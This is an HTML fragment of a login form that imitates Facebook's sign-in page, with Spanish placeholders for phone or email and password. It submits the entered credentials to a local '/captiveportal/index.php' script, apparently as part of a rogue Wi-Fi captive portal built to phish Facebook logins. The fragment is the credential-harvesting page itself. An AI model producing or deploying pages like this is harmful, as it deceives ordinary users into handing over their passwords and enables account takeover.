    ...
    <section class="login-form-wrap">
      ...
      <h1 class="disable-selection">facebook</h1>
        ...
        <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            ...
            <center><label><input type="text" name="email" placeholder="Número de celular o correo electrónico" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
            <label><input type="password" name="password" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
